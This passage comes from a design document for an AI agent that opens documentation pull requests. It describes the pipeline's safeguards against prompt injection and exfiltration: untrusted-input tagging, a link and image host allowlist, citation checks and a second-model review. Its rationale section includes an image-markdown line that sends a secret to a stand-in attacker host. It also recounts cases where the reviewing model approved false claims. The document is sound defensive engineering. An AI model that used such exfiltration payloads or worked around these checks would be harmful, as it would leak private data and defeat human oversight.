  `productionresultssa<n>.blob.core.windows.net` or
  `pipelines<name>.actions.githubusercontent.com`. It refuses to write a
  list that fails this check, or one with no `productionresultssa` host.
  The tools server follows GitHub's downloads only to these hosts.
- **Where:** `schema/github-log-hosts.schema.json`,
  `src/lib/github-hosts.ts`, reported by `src/check/github-hosts.ts`; the
  fetch in `src/tools-server/fetch-github-hosts.ts`.
- **Why:** job logs download from signed URLs on GitHub's storage hosts.
  GitHub's own list also has `*.core.windows.net`, which would reach any
  Azure storage account, so a run that reads logs may reach only these exact
  names. A host GitHub adds later is refused by the tools server until the
  list is fetched again.
- **Tests:** `test/github-hosts.test.ts` (wildcards, look-alike hosts,
  malformed entries, the shipped file; the fetch writes a passing file and
  leaves the old one on any failure; a property test that no answer yields
  a wildcard).

## The mailbox of collect.ts reads what it gets as untrusted

- **Rule:** the mailbox is the transport between `collect.ts` and its own
  tools server, in `collect/mcp/` of the run directory, outside the data
  directory: `to-server/` (`collect.ts` writes) and `to-box/` (the tools
  server writes), one JSON-RPC message per file named by a six-digit
  sequence number, written to a temporary name and renamed. The tools
  server takes each file once, in sequence order, and refuses and records:
  a name that is not a message file, a sequence number not above the last
  one taken, a link, a file with more than one hard link, anything but a
  regular file (a pipe, a directory), a file over 64 KB, invalid JSON,
  anything but a JSON-RPC request or notification, and a repeated request
  id. A malformed request that carries an id is answered with an error so
  the client does not wait. The mailbox closes when `to-server/` holds
  more than `3 x collect_tool_calls + 50` entries (in-progress names
  included) or has held more file names than that over the run. A burst
  of change notices leads to one scan, so the server keeps answering and
  its timers keep running while the client rewrites files as fast as it
  can. A reply over 256 KB is replaced by an error. The runner opens the
  mailbox directories once, refusing links, and reads and writes only
  through those open directories, so a directory swapped for a link later
  is never followed. The client end sends at most 64 KB and hands on only
  replies to requests it is waiting for. The box never uses a mailbox: the
  model's tools are on the tools socket.
- **Where:** `src/tools-server/mailbox.ts` (server end, reading with
  `readUntrusted` from `src/run-job/untrusted.ts`),
  `images/agent/pi-mcp-mailbox/src/protocol.ts` (the layout and limits both
  ends share), `images/agent/pi-mcp-mailbox/src/client.ts` (client end,
  used by `src/collect/tools.ts`).
- **Why:** `collect.ts` is job code that handles text anyone can write,
  and the directory it writes into is its own. Nothing it writes may make
  the runner read or write outside the mailbox, or reach the MCP server
  unchecked.
- **Tests:** `test/tools-mailbox.test.ts` (malformed JSON, oversized
  files, symbolic links, hard links, pipes, directories, out-of-order and
  repeated sequence numbers, repeated ids, junk names, floods of plain and
  in-progress names, the event loop during a rewrite storm, an oversized
  reply, a swapped directory, and on the client end replies it did not ask
  for), `test/tools-e2e.test.ts` (the report copy against junk names and a
  swapped mailbox).

## Proposed pull request changes pass the PR checker

- **Rule:** an answer that proposes documentation changes is a patch set
  (`schema/patch-set.schema.json`): one entry per page with `no_change`, or
  a unified diff of that page and, for every removed and added line, the
  evidence that makes it true. The checker names the page and the reason
  for every problem. A problem with one page leaves that page out of
  delivery and the other pages go on; the run fails when the answer does
  not match the schema or lists a page twice, when one repository's pages
  that remain change more lines than `max_changed_lines`, when no page
  with a patch remains, or in a revision (its replies would describe
  changes that are not pushed). The problems:
  - a page is in a repository or at a path the job may not change (the
    `pr` output's `repos` and `paths` globs, or a replay's `rules`), or
    the path is not a plain relative path;
  - one repository's pages without a problem change more lines in total
    (removed plus added) than `max_changed_lines`;
  - the patch is not a unified diff, holds more than one file, names
    another file than its page, or creates, deletes, renames, copies or
    changes the mode of a file. The one exception is `output.new_files`:
    a patch may create a file from `/dev/null` (`new file mode` allowed)
    under one of its `paths`, at most `max` a run, only where the run
    knows the file is absent (an input page with `absent: true` and no
    lines, or a page on demand that was not there); a page known absent
    takes no other patch, and delivery checks the file is still absent at
    the base;
  - it does not apply to the page as the run was given it (context and
    removed lines must match exactly; hunk line counts are recounted from
    the body and the nearest match to the header's line is used, as
    `git apply --recount` does), changes nothing or empties the page;
  - it changes the frontmatter in any way, adding or removing it
    included, beyond the keys the job may change (the `pr` output's
    `frontmatter_keys`, or a replay's or file job's
    `rules.frontmatter_keys`; atlas-doc-refresh names `depends_on` but not
    `used_by`, which the atlas generates; lines there need evidence like any other, and `intent`,
    `audience` and `owner` never count as allowed); the message names the
    keys, and the protected ones;
  - with the `pr` output's `data_keys`, in a YAML or JSON file (`.yml`,
    `.yaml`, `.json`), it changes a value of a key not in `data_keys` (a
    value in a list counts as its key's), adds, removes, renames or moves
    a key, changes how long a list is or how many documents the file
    holds, changes a comment, or leaves a file that no longer parses
    (`src/output-check/data-values.ts`); a file a program reads keeps its
    shape, and only the text a person would review changes;
  - on an `.mdx` page, it changes a component tag: every `<Cast>`, `<Step>`,
    `<Only>`, `<Edition>`, `<Credential>`, `<Verbatim>`, `<OsCommand>`,
    `<When>` and edition badge tag stays as it is, in the same order, so a
    recorded cast keeps its steps and no edition gate opens, closes or
    changes (`src/output-check/docs-components.ts`); text between the
    tags may change;
  - on a public-docs Get started or Survey page (the pages built into
    the per-edition manuals), an added line outside code, `<Only site>`
    and `<Verbatim>` says "edition", "depending on your license" or
    "other products", or, outside any `<Only>`, names the credential of
    the other kind of edition (a Notes License on an online page, a Notes
    Pass on an air-gapped one); the patterns are the public docs manual
    lint's own, kept in one place with a test against it;
  - a changed line is listed under no change with evidence (blank lines
    need none), a change lists a line the patch does not change, or a
    change cites nothing;
  - a citation is the atlas (`notes-co/atlas`), a page the job
    itself maintains (a path matching its globs in one of its
    repositories; a job with `output.code_fix` may cite the code it
    changes), a malformed repository or commit, has neither a commit
    nor a path and a line, or, when the run was given a list of sources,
    is not in it (a code line within an excerpt, a commit, a file of that
    commit, or a search);
  - when the run's input has a `uiSource` (the dashboard's navigation
    files and routes, which the docs watch jobs collect), an added line
    brings in a bold, label-shaped name (one to four capitalized words) or
    an `/app` path that the removed lines did not already have and that is
    neither element text or a quoted string in `uiSource` or in the added
    lines of a dashboard commit in the sources, nor one of its routes;
  - the answer does not match the schema, or lists a page twice.

  A job with `output.pages_on_demand` may patch a page the input did not
  give: before the checker runs, the runner reads it with the reader app
  (in one of the job's `repos`, matching the option's `paths`, at the
  commit of the input's other pages of that repository or the head of
  its default branch, at most 10 a run and 512 KB each, never a binary
  file), and every rule above holds for it as for a given page.
  `pages-on-demand.json` keeps the pages read, and `flax agents check-output`
  checks a report against them.

- **Where:** `src/output-check/pr.ts` (the rules), `src/output-check/diff.ts`
  (parsing and applying), `src/output-check/glob.ts`, `src/output-check/report.ts`
  (a run report: a `pr` job is held to its `job.yml`, a replay to the rules
  in its input; a report whose input came from the fixture must carry the
  committed fixture), `flax agents check-output <report dir>...`, and
  `runPrStage` in `src/run-job/pr-output.ts`, which runs it inside
  `flax agents run-job` on every run of a job with `output.kind: pr`, shadow and
  stub runs too, and leaves out the pages with a problem or fails the
  run, as above (`pr-check.json`; the run's `status.json` lists the pages
  left out under `delivery.dropped`, and the pull request names them).
  Building and linting the target repository with the patch applied is not
  done yet.
- **Why:** a pull request from an agent must be small, factual and
  traceable, and reviewers should only ever see ones that are. Every rule
  here is one a reviewer would otherwise have to check by hand, and most
  are what a misled or careless model gets wrong: editing a page it was
  not asked about, rewriting frontmatter written by people, citing the
  atlas or another doc instead of the code, or inventing a line number.
- **Tests:** `test/output-check.test.ts` (each rule with a small page;
  hunk recounting, offsets, order and overlap; a property test that a
  random one-line replacement applies exactly where it was made; globs;
  citations against sources; UI labels and dashboard paths against
  `uiSource`) and the checker proof: every file in
  `test/output-check-cases/` is an answer to the replay input with the
  verdict and reasons the checker must give (29 cases: 4 good, 25 bad,
  from a wrong repository to a hidden second file in a patch), and
  `flax agents check-output --proof` prints the same run.
  `test/docs-drift-replay.test.ts` covers reports (a `pr` job's
  `uiSource` included) and the replay's reference answer.
  `test/atlas-doc-refresh.test.ts` covers the allowed frontmatter keys
  on the job's fixture, from its input's rules and from its `job.yml`.
  `test/pr-kit-options.test.ts` covers new files and pages on demand,
  `test/pr-kit-options-run.test.ts` a report checked again with its
  pages on demand.

## Added lines carry no images and link only to allowlisted hosts

- **Rule:** the PR checker also refuses, naming the line in the patched
  page and the rule, any line a patch adds that brings in something the
  page did not already have:
  - a Markdown image (`![...](...)`, `![...][ref]` or `![...]`), an HTML
    `<img>` tag, or an HTML tag or attribute that loads or links a URL
    (`src`, `srcset`, `href`, `xlink:href`, `poster`, `background`,
    `action`, `formaction`, `data`), whatever the host. The one exception
    is an `href` whose literal value is a plainly relative path (no scheme,
    no host, not starting with `//`, no backslash, `%`, whitespace or
    character reference), such as `<Card href="/docs/x" />`: it cannot
    send data off our site. Any other attribute, relative or not, is
    still refused, and so is every image;
  - a link or bare URL (Markdown links and reference definitions,
    `<...>` autolinks, `http://` and `https://` URLs, protocol-relative
    `//host` targets, `www.` names) to a host that is neither in
    `link-hosts.yml` nor already linked from the page. Every URL start in
    a line is read on its own, so a URL in another URL's query counts, and
    the host is the one a browser would use (`https://docs.notes-co.example@x.example`
    goes to `x.example`). A host the file opens only under a path
    (`github.com/notes-co`) gets no page exception: a link to
    github.com outside `/notes-co` is refused even when the page
    links elsewhere on github.com;
  - a new link whose query string is longer than `max_query_length` (64),
    unless its host is in `long_query_hosts` (github.com);
  - a link with any scheme but http and https (`mailto:`, `javascript:`,
    `data:`), or a link target written with character references or
    backslash escapes, which the checker does not decode.
    An image, tag or URL whose exact text the page already has may be kept
    or moved. `link-hosts.yml` lists `github.com/notes-co`,
    `docs.notes-co.example`, `docs.notes-labs.dev`, `api.notes-co.example`,
    `notes-co.example`, `*.notes-co.example`, `notes-labs.dev`, `*.notes-labs.dev`,
    `*.notes-co.example`, `sample-site.org` and `www.sample-site.org` (a `*.` entry is any host below
    that name, not the name itself) and validates against
    `schema/link-hosts.schema.json`: lower-case names with no scheme, port
    or trailing dot, wildcards over at least two labels, no other keys.

  It is not the `links` list of `channels.yml`: that one holds a posted
  Slack message to three URL prefixes (our GitHub organization, our
  OpenObserve and our Slack workspace) and has no page exception. Each
  list checks only its own output, a changed page or a Slack message, so
  they never apply to the same text; a page may link to our public sites,
  which a health message has no need for, and never to the Slack
  workspace, which readers of a page may not belong to.

- **Where:** `src/output-check/links.ts` (the rules), called from
  `checkPage` in `src/output-check/pr.ts`, so it runs wherever the PR
  checker does: `flax agents check-output`, the checker proof, and `runPrStage`
  inside `flax agents run-job`. The file is `link-hosts.yml` (code owner review),
  loaded by `src/lib/link-hosts.ts` and reported by
  `src/check/link-hosts.ts`; a checker without a valid file throws rather
  than skip the rule.
- **Why:** the lethal trifecta is private data, untrusted content and a way
  out. A run sees private data and may read text anyone can write, and the
  box has no network, so the way out left is what gets delivered. GitHub
  renders Markdown images in pull request diffs and previews by fetching
  them through its image proxy, so an added
  `![x](https://attacker.example/?d=<secret>)` leaks the secret with no one
  clicking. A plain link leaks when a person clicks it or a tool unfurls
  it. Refusing images outright and holding links to a short reviewed list
  of our own hosts closes that channel; the query limit keeps a link to an
  allowed host from carrying a payload. The pull request body already
  holds model text only inside fenced blocks.
- **Tests:** `test/output-check.test.ts` (images on any host, reference
  images, `<img>`, `<a href>`, a bare `srcset`; relative `href` values
  allowed in tags, JSX and bare attributes, while `//host`, escaped,
  encoded, `javascript:` and expression values, and relative `src` or
  `poster`, are refused; unknown hosts in links,
  definitions, protocol-relative, `www.`, userinfo and nested URLs;
  `mailto:` and escaped targets; allowlisted hosts, relative links and
  long GitHub queries allowed; URLs, images and hosts the page already has
  allowed; github.com outside notes-co refused even when the page
  links there; the query limit; a given allowlist; line numbers across
  hunks), `test/link-hosts.test.ts` (the shipped file, a missing file,
  broad wildcards, schemes, ports, upper case, unknown keys) and the
  checker proof cases `bad-link-image` and `bad-link-unknown-host`, and
  `test/atlas-doc-refresh.test.ts` (the atlas job's answer with an
  image or a link to an unlisted host).

## Runs record whether the model saw untrusted text

- **Rule:** every `tool.yml` says `source: untrusted` when its results can
  carry text anyone can write (pull request and issue bodies and titles,
  comments, Slack messages, log lines, event messages, trace attributes,
  web pages, notes a model wrote) and `source: trusted` when they carry
  only text a person reviewed before it landed or our own systems wrote
  (files and commits on `main`, releases, cluster state, metrics). The
  tools server tags every call record and every result with its tool's
  source. After the box stops, the runner records in `status.json` and
  `summary.md` whether the model saw untrusted text: an answered call of
  an untrusted tool by the model, or by `collect.ts`, whose output reaches
  the model as the input. A job with `output.kind: pr` must set
  `untrusted_input`: with `report_only`, a run that saw untrusted text
  keeps its plan in the report, skips the second check and opens no pull
  request (the run still passes); with `open_pr`, it goes on, and the pull
  request says which tools the text came from. A job with
  `output.kind: slack` may set `untrusted_input` too: `post`, the
  default, posts the message, held to the message rules below;
  `report_only` keeps it in the report and posts nothing (the run still
  passes).
- **Where:** `source` in `schema/tool.schema.json` and every
  `tools/*/tool.yml`, `ToolsServer.call` in `src/tools-server/server.ts`,
  `src/run-job/input-gate.ts`, `src/run-job/run.ts`,
  `src/run-job/pr-output.ts`, `src/run-job/slack-output.ts`.
- **Why:** the model reads everything a run gives it, and text anyone can
  write can carry instructions meant for it. Marking results as data
  lowers the odds they are followed; the gate removes the payoff, since a
  misled run then writes nothing anyone has to review as a proposal. Each
  tool's tag is a reviewed line in its own `tool.yml`, so adding a tool
  forces the question. Slack jobs default to `post` because the jobs meant to
  post (health reports) always read log lines and alert messages, which
  are untrusted by definition, so `report_only` would stop every post;
  what a misled run can put in a message is bounded instead: the layout is
  `render.ts`'s, model text lands only in the fields it fills, and the
  message rules take out mentions and links off the list.
- **Tests:** `test/input-gate.test.ts` (every shipped tool's tag, tags on
  calls and results), `test/run-job-pr.test.ts` (`collect.ts` reading an
  untrusted tool: recorded, `report_only` opens nothing and skips the
  second check, `open_pr` says so in the pull request),
  `test/slack-delivery.test.ts` (`report_only` posts nothing),
  `test/tools.test.ts`.

## Claims about code rest on code, not only on a README

- **Rule:** before the attribution check and the second check, the
  citation check leaves out a page (`by: citation-check`) with a
  sentence or `;` clause of an added line whose quoted code (a backtick
  identifier other than a file path, or a literal token of a quoted
  command line or argument form) is in a documentation file the change
  cites (a README, CHANGELOG, `.md`, `.mdx`, `.rst`, `.adoc` or `.txt`
  file, or anything under `docs/`, `doc/`, `adr/`, `adrs/` or `plans/`)
  and in none of the code files it cites. It judges a change only when
  every code file it cites was read whole and it cites no commit without
  a path, and skips a clause the page's removed lines already make and a
  clause about what a document says (a documentation file's name
  followed by "says", "states", "still", "lists" or the like). The
  second check's prompt holds every line that says what code does to a
  cited code file or diff too, with an example. The job prompt of
  atlas-doc-refresh says the same.
- **Where:** `citationProblems` and `docOnlyClaims` in
  `src/run-job/review-files.ts` (the tokens from `quotedCode` in
  `src/run-job/attribution.ts`), `isDocCitation` in
  `src/output-check/pr.ts`, the second check's prompt in
  `src/run-job/review.ts`, `jobs/atlas-doc-refresh/prompt.md`.
- **Why:** the PR checker already refuses a change whose evidence is
  documentation only, but a change can cite a code file beside a README
  and take its claim from the README alone. Run 37950687564 wrote "the
  action mounts the runner's docker config read-only (action.yml,
  README.md)": action.yml has no mount (the CLI's wrapper does it), the
  sentence came from README.md, and the second check approved it on
  README.md's word. A README can be wrong about which part does the work.
  Whether a quoted token is in a cited file is a fact code can read;
  prose with no quoted code still needs the second check.
- **Tests:** `test/review-files.test.ts` (run 37950687564's change
  with action.yml and README.md as they are at f536938 is left out; a
  clause whose quoted code action.yml has passes; a clause about what
  README.md says, a clause already on removed lines, a code file shown in
  part and a pathless commit citation are not judged).

## A pinned job's model reads files at the commits it documents

- **Rule:** for a job that sets `pin_files: true`, the runner reads the
  input's `repos` object (`notes-co/<name>` to a full commit sha;
  anything else is ignored) and the model's `gh-file` reads each of those
  repositories at that commit, unless a call names a `ref` (`main` or a
  full sha). Other repositories, and every job without it, read `main`.
  The GitHub guard lets `get_file_contents` read a commit only by its
  full sha, never a short one or a branch, and never with a `ref` too.
  `collect.ts`'s own reads are not pinned: its input sets the pins.
- **Where:** `tools/gh-file/`, `inputCommits` in `src/run-job/tools.ts`,
  the model's tools server in `src/run-job/run.ts`, `commits` in
  `src/tools-server/mapping.ts` and `server.ts`, `githubGuard` in
  `src/tools-server/github.ts`, `pin_files` in `schema/job.schema.json`
  and `src/lib/job.ts`; atlas-doc-refresh sets it.
- **Why:** a doc is refreshed to one commit, its sources and stamp are at
  that commit, and the second check reads cited files at it. A file read
  from `main` can be newer: run 37956621758's writer quoted widget's
  later `main` pom versions while documenting cab3460, and the page was
  left out. Reading by full sha is as trusted as `gh-compare`, which
  already reads any commit of the organization by sha.
- **Tests:** `test/tools-catalog.test.ts` (a pinned repository read at
  its commit, `ref` reading `main` or another commit, an unpinned one at
  `main`, every call passing the guard), `test/tools-reads.test.ts` (the
  guard), `test/run-job-tools.test.ts` (the input's pins reach the
  model's tools with `pin_files` and not without it; only full shas of
  the organization's repositories pin), `test/atlas-doc-refresh.test.ts`
  (the job sets it; the input pins each drifted repository to its `to`
  commit).

## Credits on changed lines are checked against GitHub by code

- **Rule:** a pull request job whose output sets `attribution_check: true`
  runs the attribution check after the citation check and before the
  second check, whenever the run has the reader app. For every claim of
  an added line that credits a commit or pull request (a `## recent`-style
  line whole, otherwise each sentence or `;` clause; a claim the page's
  removed lines already make word for word is skipped), it reads each
  credit from GitHub through the same requests as the second check's
  credited commits, each path once per run, and leaves the page out
  (`by: attribution-check`, named in `status.json`, the summary's
  "left out" count and the pull request) when a credit is not merged
  into its repository's default branch (or, for a commit, not on it), is
  unknown to GitHub or cannot be read, when a `merge <sha>` given is not
  the pull request's merge commit, when a date on the claim is not the
  day the credit landed in America/Los_Angeles, when a backtick-quoted
  code identifier on the claim is on no added or removed line (and is no
  changed path) of any credited diff, which for a merge commit is the
  whole pull request against its first parent, or when a backtick-quoted
  command line or argument form (text with a space or a `<placeholder>`)
  has none of its literal tokens (a URL scheme such as `docker://`, a
  flag, a path, a dotted, underscored or punctuated name) on such a line;
  a form with no such token is not checked. Unchanged lines never
  count, and a one-word lowercase identifier counts only where the diff
  line uses it as code. A claim that says nothing was added, removed or
  renamed also passes on a YAML or JSON key with a changed line inside
  its block. A quoted file path is never checked, since only shas and
  pull request numbers credit. An identifier missing from a diff GitHub
  cut short is unverifiable and fails the page too. The details are in
  [delivery.md](delivery.md#pull-request-delivery), step 4.
- **Where:** `src/run-job/attribution.ts`, `runPrStage` in
  `src/run-job/pr-output.ts`, `attribution_check` in
  `schema/job.schema.json` and `src/lib/job.ts`; atlas-doc-refresh opts in.
- **Why:** a history line is only as good as the commit it names, and
  the second check, a model, approved run 37858085063's line crediting
  the `image` input to PR #30 with the disproving diff in its input: in
  that diff `image:` is an unchanged line. It also approved run
  37963865908's line crediting the `[subject] docker://<image>`
  argument form to 066f6c1, whose diff has no `docker://`; the check
  skipped that form for its placeholders until it read its literals. Whether a credited diff
  changes a quoted identifier, and on which day a pull request merged,
  are facts code can read, so code decides them and no model can approve
  them away.
- **Tests:** `test/attribution.test.ts` (run 37858085063's PR #30 line,
  built from its report and GitHub's real answers, fails and its PR #29
  line passes; run 37871042176's cli-scan page, crediting PR #30 with
  what it changed in the `image` block, passes, and fails once it says
  #30 added the input; run 37869719952's GAPS page, naming a file the
  credited commit left unchanged, passes; a wrong date, a Pacific
  evening merge, an identifier only on unchanged lines, a diff cut
  short, unmerged and other-branch pull requests, a wrong merge commit,
  an unknown credit, a commit's landing day, claims the page already
  made, how a line splits into claims and which identifiers and file
  paths count; run 37963865908's survey page, crediting the
  `docker://` argument form to 066f6c1, fails, the same form credited
  to PR #30 passes, a form with no literal is skipped, and which tokens
  of a command line count), `test/run-job-pr.test.ts` (a page left out
  before the second check, a right credit reaching it with every GitHub
  path read once, a job that does not opt in).

## A second check approves every pull request before it is opened

- **Rule:** once a pull request job's answer passes the PR checker and the
  untrusted-input gate, and changes at least one page, the runner starts a
  second model run through the same path as the first (`lbx --run`, the
  same model, thinking level, socket directory, forwarder and gateway
  key) in a fresh data directory, with Pi's read-only tools only: no job
  tools, no shell. Its data directory holds only a fixed prompt
  (`src/run-job/review.ts`), the review schema and the review input: the
  proposed patches with their reasons, each change's citations with the
  sources they point into, the content of each file cited by path
  (`cited_files`, read with the reader app at the cited commit by
  `src/run-job/review-files.ts`: numbered lines, whole up to 1,000 lines
  and 80 KB, otherwise the lines around what the change names, 400 KB and
  40 files per page; an unreadable file is listed with a note), every
  commit and pull request the changed lines credit (`credited_commits`,
  read with the reader app by `src/run-job/review-commits.ts`: a commit
  sha or pull request number in an added line, looked up in the
  repositories the change cites, or a commit cited with no path; its
  subject, its own date, the merged pull request that landed it and
  `landed_at`, that pull request's merge time, with its day in
  America/Los_Angeles as `landed_day_pacific`, by which a line's date is
  judged, and its diff against its first parent, which for a merge commit
  is the whole pull request: 120
  lines per file and 40 KB per commit, the files the page names first;
  past 16 credits on a page each file gets fewer lines (down to 30) and
  each commit a share of 480 KB (at least 8 KB), so every credit is
  shown; past 100 credits a page's further credits are listed unread with
  a note; what GitHub does not know is left out, what could not be read
  is listed with a note), and the rules (the job's repositories, paths,
  line limit and `frontmatter_keys`, the fixed kit rules, whose rule on
  frontmatter names those keys as the only exception, the job's
  `prompt.md`). A plan whose only changes are stamps (below) skips it:
  the model changed nothing. Nothing else of
  the run's input reaches it: not the pages, not what `collect.ts` or a
  tool gathered. It must answer `approve` or `reject` with reasons within
  10 minutes. A rejection whose every reason names a proposed page (its
  `repo` and `path`) leaves those pages out, as the PR checker does, and
  the rest goes on; any other rejection, and every rejection of a
  revision, delivers the run as a report. Each change in the input carries
  its number on its page (`change`), and a reason about one change names
  it. For a job with `output.drop_refused_changes`, a first rejection
  whose every reason names a change has the job's `publish.ts` rebuild
  the answer without those changes; the rebuilt answer passes the PR
  checker, the citation and attribution checks and a second call of the
  check again, and is delivered only when that approves. There is at most
  one such retry, only while the run's key has at least as much left as
  the run has spent; a second rejection delivers the run as a report. An answer that does not match
  the review schema, or a box that does not end cleanly, fails the run.
  An input over 600 KB is reviewed per page, and a page still over it
  that credits several commits in parts by its credits, each with the
  whole page change and its share of the commits, none cut, and the
  other parts' credits listed as checked elsewhere; a page passes only
  when every one of its parts approves. The report keeps
  `review/input.json`, `review/argv.json`, `review/answer.txt`,
  `review/verdict.json` (the merged verdict) and its transcript, each
  further call's files under `review/<n>/`, and `review/split.json`
  naming each call's pages, credit part and input file.
- **Where:** `src/run-job/review.ts`, the second check in
  `src/run-job/run.ts`, `runPrStage` in `src/run-job/pr-output.ts`,
  `reviewSeconds` in `src/lib/job.ts` (the key's lifetime and the
  workflow timeout).
- **Why:** the code checks cover shape (paths, limits, frontmatter, a patch
  that applies, citations that exist). Whether a cited commit really makes
  a sentence true needs judgment, and the model that wrote the change has
  also read everything that could have misled it. A fresh context that
  sees only the change and its evidence cannot be steered by the raw
  inputs, and costs one short call within the run's own budget. A
  history line ("PR #29 (merge f536938) made `subject` optional") is
  only as good as the commit it names, so the second check sees that
  commit's own diff and merge date and rejects a line whose credited diff
  does not show the change, or whose date is not when the change landed.
- **Tests:** `test/review-commits.test.ts` (what a change credits, the
  credited commits' diffs, merge dates and limits, every credit of a page
  that names many, their place in a split or trimmed input),
  `test/review-input.test.ts` (splitting per page and per credit part,
  trimming, merged verdicts, numbered changes and the `change` a reason
  names), `test/drop-refused.test.ts` (leaving out refused changes and
  checking once more: approved, rejected again, a reason with no change,
  nothing left to publish, the budget, a revision), `test/run-job-pr.test.ts` (what the second check sees and
  never sees, its argv, approve, reject, no verdict, a stub run, the
  forwarder kept open for it and the tools socket gone, the frontmatter
  keys in its rules, no second check for stamps alone),
  `test/gateway.test.ts` (the key's lifetime),
  `test/generated.test.ts` (the timeout).

## Pull requests are opened by kit code, on agent branches

- **Rule:** only a live run of a job with `output.kind: pr`, not a stub,
  delivers, and only after the schema, quotes, PR checker, untrusted-input
  gate and second check all let it. Delivery makes an installation token of
  the writer app from `AGENTS_WRITER_APP_ID` and
  `AGENTS_WRITER_PRIVATE_KEY` (a live run refuses to start without them),
  asking for `contents`, `pull_requests` and `checks` write and
  `metadata` and `members` read on the target repositories only (when the
  installation has not accepted `checks` and `members` yet, GitHub refuses
  that token and delivery asks for the first three alone, going on
  without check runs or team review requests and saying so in the report),
  and revokes and refuses a token granted any other permission or
  repository; the token is revoked when delivery ends.
  Before writing, it checks the plan again against the job's `repos`,
  `paths` and `max_changed_lines`, and checks that each page in the
  repository at the base commit is exactly the page the run was given (a
  mismatch fails the run with nothing written). It commits the patched
  pages, keeping each file's mode and final newline, with the fixed author
  `agents`, on the base commit, to `agent/<job>/<YYYY-MM-DD>`
  (created, or moved when it exists), and opens one pull request, ready
  for review, against the default branch, or updates the one already open on that
  branch. Then it closes, with a comment naming the new one, every other
  open pull request of the job in that repository (opened by a bot, from
  the repository itself, on an `agent/<job>/<day>` branch) and deletes its
  branch: at most one open agent pull request per repository per job. The
  writer has no call that merges or approves, refuses any branch that is
  not `agent/<job>/<YYYY-MM-DD>` or `agent/<job>/<key>` and any
  repository outside the organization before sending anything. A job with
  `output.branch_key` writes `agent/<job>/<key>` instead of the day's
  branch, the key read by code from a top-level field of the input or the
  answer and refused (failing the run) unless it is two to eight groups
  of lowercase letters and digits joined by hyphens, at most 64
  characters and not a date; it updates the open pull request of that
  key and closes, updates or deletes none of the job's others. Sections
  the job's `publish.ts` writes into the body are escaped like model
  text, with links only to the `links` prefixes of `channels.yml`. The body is
  written by the kit; the model's words appear only inside fenced text
  blocks. Each opened or updated pull request gets a completed check run,
  `Notes Agent / <job>`, on its new head commit (the YouTube map pull
  request too): success, or neutral when pages were left out, with a
  summary the kit writes (PR checker, second check, pages changed and
  left out, changes and citations, model cost, the run); a left-out
  page's problem appears only inside a code span. The writer writes a check
  run only on the head of one of the job's own `agent/<job>/<day>`
  branches, checking the branch is at that commit first. A check GitHub
  refuses is recorded and never fails delivery. A shadow run's plan names
  the check it would write. With `output.notify`, after the writer token
  is revoked, a live run posts one notice to that channel naming each pull
  request it opened (never one it only updated), under the Slack message
  rules; a shadow run posts it to the shadow channel under the shadow
  line, or nothing when that channel has no id; a stub run posts nothing.
  A notice that cannot be posted is a problem in the report and never
  fails the run or undoes the pull request.
- **Where:** `src/deliver/writer.ts` (the interface and branch rules),
  `src/deliver/github-writer.ts` (the GitHub REST calls and the token),
  `src/deliver/checks.ts` (check run names, text and writing),
  `src/deliver/plan.ts`, `src/deliver/deliver.ts`,
  `src/run-job/pr-output.ts`, `createInstallationToken` in
  `src/tools-server/github.ts`, `deliverySecrets` in
  `src/generate/render.ts`.
- **Why:** the model never holds a write credential, and code that does
  can be read and tested. Pull requests on agent branches keep every change behind
  a person's review; checking the page on GitHub keeps a patch checked
  against one text from landing on another; one open pull request per job
  keeps reviewers from triaging the same drift twice.
- **Tests:** `test/deliver.test.ts` (branch names, the plan and its
  re-check, the body's escaped prose, links and preview, delivery against a fake writer:
  replacing, same-day updates, a changed page, modes and newlines; the
  GitHub writer against a fake GitHub API: exact requests, refusals before
  sending, no approve call, merging only agent pull requests at the expected
  head; the token's permissions, repositories and revocation),
  `test/auto-merge.test.ts` (auto_merge: merged when every path matches,
  left open with the reason otherwise or when GitHub refuses, the glob check),
  `test/run-job-pr.test.ts` (end to end: delivered, refused without the
  secrets, the token scrubbed, stub runs, the notice), `test/pr-notice.test.ts`
  (the notice: on open only, shadow and stub runs, a failed post, the
  check and the secrets), `test/generated.test.ts`,
  `test/pr-kit-options.test.ts` (key branches: other keys and day
  branches untouched, the same key updated, the per-key waiting rule;
  sections in the body), `test/pr-kit-options-run.test.ts`.

## Revisions answer trusted reviewers, on the pull request's own branch

- **Rule:** a revision run (`--revise owner/name#number`) needs a live job
  with `output.kind: pr` and a repository in its `repos`. It acts only on
  an open pull request on the job's own `agent/<job>/<day>` branch, opened
  by a bot from the repository itself, and only on requests from authors
  GitHub marks as `OWNER`, `MEMBER` or `COLLABORATOR` (never a bot): a
  Request changes review with its line comments, or a comment or line
  comment starting with `/agent`. At most 5 rounds per pull request. Its
  pages are the pull request's pages at its head; it may change only pages
  the pull request changes or a line comment points at, inside the job's
  `paths`; it sets no stamps. The answer passes the same schema, quotes,
  PR checker, untrusted-input gate and second check as any run; a request
  is evidence only for a line of its own text (`review/<id>`). The commit
  goes onto the pull request's branch with its head as parent and the ref
  moves only forward; if the branch moved, nothing is written. The writer
  replies to each line comment in its own thread and posts one summary
  comment per round, written by the kit, with the model's replies as
  escaped plain prose; every round that read its requests answers
  them, failed or not. The round's `Notes Agent / <job>` check run shows
  it on the pull request: the poller, once it starts the revision run,
  queues one on the head commit ("Revision requested by @<login>") with a
  writer app token that may only write checks and read contents on that
  repository; the revision run moves it to in progress with its run's
  link, then completes it (success when revised or answered with no
  change, failure with the reason, neutral at the round limit or with
  nothing to revise), and a pushed commit gets its own completed check. A
  refused check call never fails the poll or the round.
- **Where:** `src/revise/` (`requests.ts` who and what counts, the
  markers and the limit; `thread.ts`; `input.ts`; `original.ts`;
  `answer.ts`; `comment.ts`; `prepare.ts`; `poll.ts` and
  `poll-cli.ts`; `check.ts` the round's check run), `deliverRevision` in `src/deliver/deliver.ts`,
  `fastForwardFrom` and `comment` in `src/deliver/github-writer.ts`,
  `citationProblem` in `src/output-check/pr.ts`, `src/run-job/run.ts`,
  `renderRevisePoll` in `src/generate/render.ts`.
- **Why:** review comments are text anyone with access could write; only
  people with a role in the repository may steer the agent, and their
  words still pass every check a first run does. Forward-only commits keep
  a revision from overwriting a person's push; answering every request
  once keeps the poller from paying for the same failing round again.
- **Tests:** `test/revise.test.ts` (requests, markers, the limit, the
  input, review citations, the comment, the artifact),
  `test/run-job-revise.test.ts` (end to end against a fake writer),
  `test/revise-poll.test.ts`, `test/generated.test.ts`.

## Frontmatter stamps are set by the job's code, after every check

- **Rule:** a job with `output.kind: pr` may name `stamp_keys`:
  frontmatter keys only its code sets. `collect.ts` lists the values in
